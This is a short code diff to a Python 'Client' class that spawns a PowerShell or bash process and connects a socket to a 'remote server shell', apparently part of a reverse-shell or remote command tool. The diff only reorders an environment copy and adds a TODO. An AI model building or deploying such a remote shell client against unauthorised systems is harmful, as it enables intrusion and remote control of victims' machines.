@@ -20,8 +20,6 @@ class Client(StreamSocket):
 
     def spawn_shell(self, op_sys: str = os.name) -> subprocess.Popen:
         """Spawn new command shell process to be used for code execution"""
-        environment = os.environ.copy()
-
         if op_sys == "nt":
             shell_exec = shutil.which("powershell")
             if shell_exec is None:
@@ -30,6 +28,8 @@ class Client(StreamSocket):
             shell_exec = shutil.which("bash")
             if shell_exec is None:
                 shell_exec = shutil.which("sh")
+
+        environment = os.environ.copy()
 
         # Popen expects [str] for non-shell calls
         shell = subprocess.Popen(
@@ -51,6 +51,8 @@ class Client(StreamSocket):
 
     def connect(self) -> None:
         """Initiate connection to remote server shell"""
+        #TODO: spawn process for shell instead running single commands
+
         sock = socket.socket()
         #sock.settimeout(60)
 
